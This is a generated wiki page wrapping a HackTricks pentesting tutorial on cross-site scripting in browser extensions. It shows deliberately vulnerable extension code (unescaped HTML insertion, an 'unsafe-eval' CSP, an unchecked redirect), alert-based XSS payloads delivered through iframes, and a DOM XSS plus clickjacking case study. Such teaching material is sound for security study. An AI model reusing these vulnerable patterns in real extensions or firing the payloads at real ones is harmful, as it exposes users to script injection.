@@ -1,0 +1,82 @@
+---
+parsed_by: focuslocust
+source: hacktricks
+type: generated
+---
+# BrowExt - XSS Example
+
+[Home](../../../README.md)
+
+## Provenance
+
+| Field | Value |
+| --- | --- |
+| Source | `hacktricks` |
+| Type | `hacktricks-topic` |
+| Record ID | `hacktricks-pentesting-web-browser-extension-pentesting-methodology-browext-xss-example` |
+| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md` |
+| Parsed by | `focuslocust` |
+| Relationship mode | `explicit / conservative inferred / manual` |
+
+## Generated Concept Page
+
+- [BrowExt - XSS Example](../../topics/pentesting-web/browext-xss-example.md)
+
+## Extracted Fields
+
+| Field | Value |
+| --- | --- |
+| id | hacktricks-pentesting-web-browser-extension-pentesting-methodology-browext-xss-example |
+| name | BrowExt - XSS Example |
+| type | hacktricks-topic |
+| source | hacktricks |
+| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md |
+
+## Preserved Source Material
+
+````yaml
+_body: "# BrowExt - XSS Example\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Cross-Site Scripting (XSS) through\
+  \ Iframe\n\nIn this setup, a **content script** is implemented to instantiate an Iframe, incorporating a URL with query\
+  \ parameters as the source of the Iframe:\n\n```javascript\nchrome.storage.local.get(\"message\", (result) => {\n  let constructedURL\
+  \ =\n    chrome.runtime.getURL(\"message.html\") +\n    \"?content=\" +\n    encodeURIComponent(result.message) +\n    \"\
+  &redirect=https://example.net/details\"\n  frame.src = constructedURL\n})\n```\n\nA publicly accessible HTML page, **`message.html`**,\
+  \ is designed to dynamically add content to the document body based on the parameters in the URL:\n\n```javascript\n$(document).ready(()\
+  \ => {\n  let urlParams = new URLSearchParams(window.location.search)\n  let userContent = urlParams.get(\"content\")\n\
+  \  $(document.body).html(\n    `${userContent} <button id='detailBtn'>Details</button>`\n  )\n  $(\"#detailBtn\").on(\"\
+  click\", () => {\n    let destinationURL = urlParams.get(\"redirect\")\n    chrome.tabs.create({ url: destinationURL })\n\
+  \  })\n})\n```\n\nA malicious script is executed on an adversary's page, modifying the `content` parameter of the Iframe's\
+  \ source to introduce a **XSS payload**. This is achieved by updating the Iframe's source to include a harmful script:\n\
+  \n```javascript\nsetTimeout(() => {\n  let targetFrame = document.querySelector(\"iframe\").src\n  let baseURL = targetFrame.split(\"\
+  ?\")[0]\n  let xssPayload = \"<img src='invalid' onerror='alert(\\\"XSS\\\")'>\"\n  let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`\n\
+  \n  document.querySelector(\"iframe\").src = maliciousURL\n}, 1000)\n```\n\nAn overly permissive Content Security Policy\
+  \ such as:\n\n```json\n\"content_security_policy\": \"script-src 'self' 'unsafe-eval'; object-src 'self';\"\n```\n\nallows\
+  \ the execution of JavaScript, making the system vulnerable to XSS attacks.\n\nAn alternative approach to provoke the XSS\
+  \ involves creating an Iframe element and setting its source to include the harmful script as the `content` parameter:\n\
+  \n```javascript\nlet newFrame = document.createElement(\"iframe\")\nnewFrame.src =\n  \"chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=\"\
+  \ +\n  encodeURIComponent(\"<img src='x' onerror='alert(\\\"XSS\\\")'>\")\ndocument.body.append(newFrame)\n```\n\n## DOM-based\
+  \ XSS + ClickJacking\n\nThis example was taken from the [original post writeup](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).\n\
+  \nThe core issue arises from a DOM-based Cross-site Scripting (XSS) vulnerability located in **`/html/bookmarks.html`**.\
+  \ The problematic JavaScript, part of **`bookmarks.js`**, is detailed below:\n\n```javascript\n$(\"#btAdd\").on(\"click\"\
+  , function () {\n  var bookmarkName = $(\"#txtName\").val()\n  if (\n    $(\".custom-button .label\").filter(function ()\
+  \ {\n      return $(this).text() === bookmarkName\n    }).length\n  )\n    return false\n\n  var bookmarkItem = $('<div\
+  \ class=\"custom-button\">')\n  bookmarkItem.html('<span class=\"label\">' + bookmarkName + \"</span>\")\n  bookmarkItem.append('<button\
+  \ class=\"remove-btn\" title=\"delete\">x</button>')\n  bookmarkItem.attr(\"data-title\", bookmarkName)\n  bookmarkItem.data(\"\
+  timestamp\", new Date().getTime())\n  $(\"section.bookmark-container .existing-items\").append(bookmarkItem)\n  persistData()\n\
+  })\n```\n\nThis snippet fetches the **value** from the **`txtName`** input field and uses **string concatenation to generate\
+  \ HTML**, which is then appended to the DOM using jQuery’s `.append()` function.\n\nTypically, the Chrome extension's Content\
+  \ Security Policy (CSP) would prevent such vulnerabilities. However, due to **CSP relaxation with ‘unsafe-eval’** and the\
+  \ use of jQuery’s DOM manipulation methods (which employ [`globalEval()`](https://api.jquery.com/jquery.globaleval/) to\
+  \ pass scripts to [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) upon\
+  \ DOM insertion), exploitation is still possible.\n\nWhile this vulnerability is significant, its exploitation is usually\
+  \ contingent on user interaction: visiting the page, entering an XSS payload, and activating the “Add” button.\n\nTo enhance\
+  \ this vulnerability, a secondary **clickjacking** vulnerability is exploited. The Chrome extension's manifest showcases\
+  \ an extensive `web_accessible_resources` policy:\n\n```json\n\"web_accessible_resources\": [\n    \"html/bookmarks.html\"\
+  ,\n    \"dist/*\",\n    \"assets/*\",\n    \"font/*\",\n    [...]\n],\n```\n\nNotably, the **`/html/bookmarks.html`** page\
+  \ is prone to framing, thus vulnerable to **clickjacking**. This vulnerability is leveraged to frame the page within an\
+  \ attacker’s site, overlaying it with DOM elements to redesign the interface deceptively. This manipulation leads victims\
+  \ to interact with the underlying extension unintentionally.\n\n## References\n\n- [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)\n\
+  - [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)\n\
+  \n{{#include ../../banners/hacktricks-training.md}}"
+_relative_path: pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md
+_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md
+````
